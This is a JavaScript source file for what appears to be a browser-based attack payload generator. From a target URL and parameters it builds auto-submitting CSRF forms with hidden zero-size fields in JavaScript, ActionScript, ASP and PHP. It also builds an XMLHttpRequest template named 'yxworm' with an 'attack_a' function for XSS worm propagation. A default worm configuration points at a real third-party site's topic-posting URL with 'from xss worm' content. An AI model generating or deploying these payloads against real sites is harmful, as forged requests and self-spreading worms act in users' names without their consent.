function _g(x){return document.getElementById(x)}	

function bind_event(o, e, fn){
    //o object
    //e event
    //fn function
    if (typeof o == "undefined" || typeof e == "undefined" || typeof fn == "undefined" || o === null){
        return false;
    }   
    if (o.addEventListener){
        o.addEventListener(e, fn, false);
    }   
    else if (o.attachEvent){  // IE
        o.attachEvent("on"+e, fn);
    }   
    else {
        var oldhandler = o["on"+e];
        if (oldhandler) {
            o["on"+e] = function(x){
                oldhandler(x);
                fn();
            };  
        }   
        else {
            o["on"+e] = function(x){
                fn(); 
            };  
        }   
    }   
    try{o.focus();}catch(e){}
}   

codz = {};
codz.so = {}; // sharedobject

codz.csrf = function(){
	var method = codz.so.method;
	var action = codz.so.action;
	var kv = codz.so.kv;
	var csrf_lang = codz.so.csrflang;

	if(method == 'GET'){
		_g("ca_textarea").value = action + "?" + kv;
	}else{
		switch(csrf_lang){
			case "js":
				_js = "function new_form(){\n";
				_js += "	var f = document.createElement(\"form\");\n";
				_js += "	document.body.appendChild(f);\n";
				_js += "	f.method = \"post\";\n";
				_js += "	return f;\n";
				_js += "}\n";
				_js += "function create_elements(eForm, eName, eValue){\n";
				_js += "	var e = document.createElement(\"input\");\n";
				_js += "	eForm.appendChild(e);\n";
				_js += "	e.type = \'text\';\n";
				_js += "	e.name = eName;\n";
				_js += "	if(!document.all){e.style.display = \'none\';}else{\n";
				_js += "		e.style.display = \'block\';\n";
				_js += "		e.style.width = \'0px\';\n";
				_js += "		e.style.height = \'0px\';\n";
				_js += "	}\n";
				_js += "	e.value = eValue;\n";
				_js += "	return e;\n";
				_js += "}\n";
				_js += "var _f = new_form();\n";
				js_args = kv.split("&");
				for(i=0; i<js_args.length; i++){
					js_arg = js_args[i].split("=");
					_js += "create_elements(_f, \"" + js_arg[0] + "\", \"" + js_arg[1] + "\");\n";
				}
				_js += "_f.action= \"" + action + "\";\n";
				_js += "_f.submit();\n";
				_g("ca_textarea").value = _js;
				break;
			case "as":
				as_args = kv.split("&");
				_as = "import flash.net.URLRequest;\n";
				_as += "var url = new URLRequest(\"" + action + "\");\n";
				_as += "var _v = new URLVariables();\n";
				_as += "_v = \"";
				for(i=0; i<as_args.length; i++){
					as_arg = as_args[i].split("=");
					if(i == as_args.length-1){_as += as_arg[0] + "=" + as_arg[1] + "\";\n"}else{
						_as += as_arg[0] + "=" + as_arg[1] + "&";
					}
				}
				_as += "url.method = \"POST\";\n";
				_as += "url.data = _v;\n";
				_as += "sendToURL(url);\n";
				_g("ca_textarea").value = _as;
				break;
			case "asp":
				asp_args = kv.split("&");
				_asp = "<%\n";
				_asp += "s = \"<form method=\'post\' action=\'" + action + "\'>\"\n";
				for(i=0; i<asp_args.length; i++){
					asp_arg = asp_args[i].split("=");
					_asp += "s = s+\"<input type=\'text\' value=\'" + asp_arg[1] + "\' name=\'" + asp_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\"\n";
				}
				_asp += "s = s+\"<\/form>\"\n";
				_asp += "s = s+\"<script>document.forms[0].submit();<\/script>\"\n";
				_asp += "response.write(s)\n";
				_asp += "%>\n";
				_g("ca_textarea").value = _asp;
				break;
			case "php":
				php_args = kv.split("&");
				_php = "<?php\n";
				_php += "$s = \"<form method=\'post\' action=\'" + action + "\'>\";\n";
				for(i=0; i<php_args.length; i++){
					php_arg = php_args[i].split("=");
					_php += "$s = $s.\"<input type=\'text\' value=\'" + php_arg[1] + "\' name=\'" + php_arg[0] + "\' style=\'display:none!important;display:block;width=0;height=0\' \/>\";\n";
				}
				_php += "$s = $s.\"<\/form>\";\n";
				_php += "$s = $s.\"<script>document.forms[0].submit();<\/script>\";\n";
				_php += "echo($s);\n";
				_php += "?>\n";
				_php += "\n";
				_g("ca_textarea").value = _php;
				break;
			case "py":
				_g("ca_textarea").value = '';
				break;
		}
	}
}

codz.ajax = function(){
	var method = codz.so.method;
	var action = codz.so.action;
	var kv = codz.so.kv;
	var form_type = codz.so.ajax_form_type;

	if(method=="GET"){
		if(action.indexOf('?')!=-1){
			if(action.lastIndexOf('?')+1==action.length) action = action + kv;
			else action = action + '&' + kv;
		}else action = action + '?' + kv;
		kv = '';
		form_type = 2;
	}
	if(!form_type){return;}

	var yxworm = "";
	yxworm += "xhr = function(){\n";
	yxworm += "  /*AJAX*/\n";
	yxworm += "  var request = false;\n";
	yxworm += "  if(window.XMLHttpRequest) {\n";
	yxworm += "    request = new XMLHttpRequest();\n";
	yxworm += "  } else if(window.ActiveXObject) {\n";
	yxworm += "    try {\n";
	yxworm += "      request = new window.ActiveXObject('Microsoft.XMLHTTP');\n";
	yxworm += "    } catch(e) {}\n";
	yxworm += "  }\n";
	yxworm += "  return request;\n";
	yxworm += "}();\n";
	yxworm += "\n";
	yxworm += "request = function(method,src,argv,content_type){\n";
	yxworm += "  xhr.open(method,src,false);\n";
	yxworm += "  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);\n";
	yxworm += "  xhr.send(argv);\n";
	yxworm += "  return xhr.responseText;\n";
	yxworm += "}\n\n";
	
	yxworm += "attack_a = function(){\n";
	yxworm += "  var src = \"" + action + "\";\n";
	var kvs = kv.split("&");
	if(kv){
		for(i=0; i<kvs.length; i++){
			k_v = kvs[i].split("=");
			yxworm += "  var " + k_v[0] + " = \"" + k_v[1] + "\";\n";
		}
	}
	if(form_type==1){
		yxworm += "  var argv_0 = \"\\r\\n\";\n";
		for(i=0; i<kvs.length; i++){
			k_v = kvs[i].split("=");
			yxworm += "  argv_0 += \"---------------------7964f8dddeb95fc5\\r\\nContent-Disposition: form-data; name=\\\"" + k_v[0] + "\\\"\\r\\n\\r\\n\";\n";
			yxworm += "  argv_0 += (" + k_v[0] + "+\"\\r\\n\");\n";
		}
		yxworm += "  argv_0 += \"---------------------7964f8dddeb95fc5--\\r\\n\";\n";
		yxworm += "  request(\"POST\",src,argv_0,\"multipart/form-data; boundary=-------------------7964f8dddeb95fc5\");\n";
		yxworm += "}\n";
	}else if(form_type==2){
		hi_yxworm = "";
		if(kv){
			for(i=0; i<kvs.length; i++){
				k_v = kvs[i].split("=");
				if(i==kvs.length-1) hi_yxworm += "\"&"+k_v[0]+"=\"+"+k_v[0]+";\n";
				else if(i==1) hi_yxworm += "\""+k_v[0]+"=\"+"+k_v[0]+"+";
				else hi_yxworm += "\"&"+k_v[0]+"=\"+"+k_v[0]+"+";
			}
		}else hi_yxworm += "\"\";\n";
		yxworm += "  var argv_0 = " + hi_yxworm;
		yxworm += "  request(\""+method+"\",src,argv_0,\"application/x-www-form-urlencoded\");\n";
		yxworm += "}\n";
	}
	_g('ca_textarea').value = yxworm;
}

codz.set_so = function(){
	codz.so.method = _g('ca_method').value;
	codz.so.action = _g('ca_action').value;
	codz.so.kv = _g('ca_kv').value;
	codz.so.csrflang = _g('csrflang').value;
	codz.so.ajax_form_type = _g('ajax_form_type').value;
	if(codz.so.action == ""){
		alert("Codz action can not be null.");
		return false;
	}
	if(codz.so.kv == ""){
		alert("Codz kv can not be null.");
		return false;
	}
	return true;
}

var oldonload;
if(typeof window.onload == 'function'){oldonload = window.onload;} // onload hack
window.onload = function(){
    if(typeof oldonload == 'function'){oldonload();}
    
    function codz_save(){
        if (window.localStorage) {
            localStorage.setItem('codz_local_db', _g('ca_textarea').value);
        }
    }
    if(/msie/i.test(navigator.userAgent)){
        _g('ca_textarea').onpropertychange = codz_save;
    }else{
        _g('ca_textarea').addEventListener("input", codz_save, false);
    }
    if (window.localStorage) {
        var v = localStorage.getItem('codz_local_db');
        if(v) _g('ca_textarea').value = v;
    }
    bind_event(window,'blur',codz_save);
    bind_event(window,'beforeunload',codz_save);

	_g('csrflang').onchange = function(){
		if(_g('csrflang').value) _g('button_csrf').disabled = false;
		else _g('button_csrf').disabled = true;
	}
	_g('ajax_form_type').onchange = function(){
		if(_g('ajax_form_type').value) _g('button_ajax').disabled = false;
		else _g('button_ajax').disabled = true;
	}
	_g('button_ajax').onclick = function(){
		if(!codz.set_so()) return;
		codz.ajax();
	}
	_g('button_csrf').onclick = function(){
		if(!codz.set_so()) return;
		codz.csrf();
	}
}
codz.resetWorm = function(){
	_g("worm_codz").value="src=\"http://www.yeeyan.com/groups/newTopic/\"\ntitle=\"xss\"\ncontent=\"from xss worm:)\"";
	if(_g('worm_set').disabled) _g('worm_set').disabled=false;
}

